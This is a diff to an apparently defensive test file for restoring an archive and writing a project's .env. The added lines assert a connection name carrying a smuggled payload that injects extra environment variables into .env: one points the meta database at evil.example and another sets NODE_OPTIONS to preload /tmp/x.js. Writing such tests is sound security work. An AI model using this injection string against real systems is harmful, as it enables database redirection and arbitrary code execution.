@@ -358,6 +358,9 @@ describe('the project’s .env, written from an export', () => {
     const result = await restoreArchive(importOptions(archive, dest));
     expect(result.projectDatabases.map((database) => database.key)).toEqual(['main']);
     expect(result.warnings.join('\n')).toMatch(/“Shop” lost its project key/);
+    // One line in the meta store too: `new` writes it into `.env` when it adopts the connection.
+    const names = await dest.meta.db.selectFrom('adminium_connections').select('name').execute();
+    expect(names.map((row) => row.name).sort()).toEqual(['Shop', 'Shop ADMINIUM_META_URL=postgres://evil.example/x NODE_OPTIONS=--require /tmp/x.js']);
 
     expect(writeProjectEnv(dest.dirs.projectRoot, result)).toEqual(['DATABASE_URL']);
     const text = await readFile(join(dest.dirs.projectRoot, '.env'), 'utf8');
